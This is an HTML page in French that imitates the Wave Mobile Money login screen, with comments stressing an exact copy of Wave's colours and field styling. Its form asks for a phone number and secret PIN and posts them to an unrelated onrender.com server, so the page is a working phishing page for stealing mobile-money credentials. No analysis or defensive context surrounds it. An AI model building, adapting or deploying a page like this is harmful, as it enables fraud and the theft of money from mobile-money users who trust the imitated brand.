<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Wave Mobile Money</title>

  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #0096FF; /* Bleu EXACT du logo Wave */
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 0;
    }

    .container {
      background-color: #0096FF; /* Même bleu pour un rendu uniforme */
      padding: 35px 25px;
      border-radius: 20px;
      width: 350px;
      text-align: center;
    }

    img.logo {
      width: 115px;
      margin-bottom: 15px;
    }

    h1 {
      color: white;
      font-size: 28px;
      margin: 0;
      font-weight: bold;
    }

    h2 {
      color: white;
      font-size: 18px;
      margin-top: 5px;
      margin-bottom: 25px;
      font-weight: normal;
    }

    /* ======= CHAMPS EXACTS WAVE ======= */
    .input {
      width: 100%;
      margin-bottom: 15px;
    }

    .input input {
      width: 100%;
      padding: 14px 18px;

      background-color: #F5F6F7;   /* Gris clair Wave */
      border: 1px solid #D3D5DA;   /* Bordure légère */
      border-radius: 30px;         /* Forme arrondie Wave */
      font-size: 16px;
      color: #1A1A1A;

      outline: none;
    }

    .input input::placeholder {
      color: #8A8A8A;
    }

    /* ======= BOUTON ======= */
    button {
      width: 100%;
      padding: 14px;
      margin-top: 10px;

      background-color: white;
      border-radius: 30px;
      border: none;
      font-size: 17px;
      font-weight: bold;
      color: #008AFF;  /* Bleu foncé wave */
      cursor: pointer;
    }

    button:hover {
      background-color: #EAEAEA;
    }

  </style>

</head>
<body>

  <div class="container">
    <img src="pingouin.png" alt="logo" class="logo">

    <h1>Connexion</h1>
    <h2>Wave Mobile Money</h2>

    <form action="https://mon-projet-2-oq6y.onrender.com" method="POST">

      <div class="input">
        <input type="tel" name="phone" placeholder="Numéro de téléphone" required>
      </div>

      <div class="input">
        <input type="password" name="pin" placeholder="Code secret" required>
      </div>

      <button type="submit">Connexion</button>

    </form>
  </div>

</body>
</html>
